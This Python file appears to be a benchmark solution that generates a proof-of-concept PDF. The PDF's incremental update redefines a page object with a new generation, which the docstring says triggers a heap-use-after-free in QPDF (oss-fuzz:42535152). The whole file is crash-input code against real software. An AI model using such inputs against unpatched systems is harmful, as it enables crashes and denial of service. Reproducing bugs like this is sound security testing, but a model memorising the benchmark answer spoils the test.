import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input to trigger a heap-use-after-free
        vulnerability in QPDF (oss-fuzz:42535152).

        The vulnerability exists in `QPDF::getCompressibleObjSet` and is triggered
        when processing a PDF file with an incremental update that redefines an object.
        This creates multiple generations for the same object ID. The vulnerable
        code iterates over a `std::set` of cached objects. Inside the loop, a call to
        `getObject` can modify the cache by resolving to a newer object generation,
        which in turn invalidates the `std::set` iterator. Subsequent use of this
        invalidated iterator leads to a use-after-free.

        The PoC constructs a minimal PDF with two parts:
        1. A base PDF with a few objects.
        2. An incremental update that redefines one of the original objects (creating
           a new generation, e.g., `3 1 obj` after `3 0 obj`) and adds another
           new object.

        This structure precisely creates the conditions required for the iterator
        invalidation and subsequent crash when a vulnerable version of QPDF attempts
        to process and rewrite the file.
        """
        f = io.BytesIO()

        # --- Part 1: Initial PDF Structure ---
        f.write(b"%PDF-1.7\n")
        # Add a binary comment to ensure the file is treated as binary
        f.write(b"%\xa1\xb2\xc3\xd4\n")

        offsets = {}

        # Object 1: Document Catalog
        offsets[1] = f.tell()
        f.write(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

        # Object 2: Page Tree
        offsets[2] = f.tell()
        f.write(b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [ 3 0 R ] >>\nendobj\n")

        # Object 3: A Page object (this will be updated later)
        offsets[3] = f.tell()
        f.write(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n")

        # Cross-reference (xref) table for the initial part
        xref1_pos = f.tell()
        f.write(b"xref\n")
        f.write(b"0 4\n")  # Describes objects 0, 1, 2, 3
        f.write(b"0000000000 65535 f \n")
        f.write(f"{offsets[1]:010d} 00000 n \n".encode())
        f.write(f"{offsets[2]:010d} 00000 n \n".encode())
        f.write(f"{offsets[3]:010d} 00000 n \n".encode())

        # Trailer for the initial part
        f.write(b"trailer\n")
        f.write(b"<< /Size 4 /Root 1 0 R >>\n")
        f.write(b"startxref\n")
        f.write(f"{xref1_pos}\n".encode())
        f.write(b"%%EOF\n")

        # --- Part 2: Incremental Update ---
        update_offsets = {}

        # Redefine object 3 with generation 1. This is the key to the exploit.
        update_offsets[3] = (f.tell(), 1)  # (offset, generation)
        f.write(b"3 1 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 300] >>\nendobj\n")

        # Add a new object to make the update structure valid and non-trivial.
        update_offsets[4] = (f.tell(), 0)
        f.write(b"4 0 obj\n(A new object in the update)\nendobj\n")

        # Xref table for the incremental update
        xref2_pos = f.tell()
        f.write(b"xref\n")
        # A single subsection for the updated object 3 and new object 4
        f.write(b"3 2\n")
        f.write(f"{update_offsets[3][0]:010d} {update_offsets[3][1]:05d} n \n".encode())
        f.write(f"{update_offsets[4][0]:010d} {update_offsets[4][1]:05d} n \n".encode())

        # Trailer for the update, pointing to the previous xref table
        f.write(b"trailer\n")
        # The size is now 5 to account for the new object 4.
        f.write(b"<< /Size 5 /Root 1 0 R /Prev ")
        f.write(f"{xref1_pos}".encode())
        f.write(b" >>\n")
        f.write(b"startxref\n")
        f.write(f"{xref2_pos}\n".encode())
        f.write(b"%%EOF\n")

        return f.getvalue()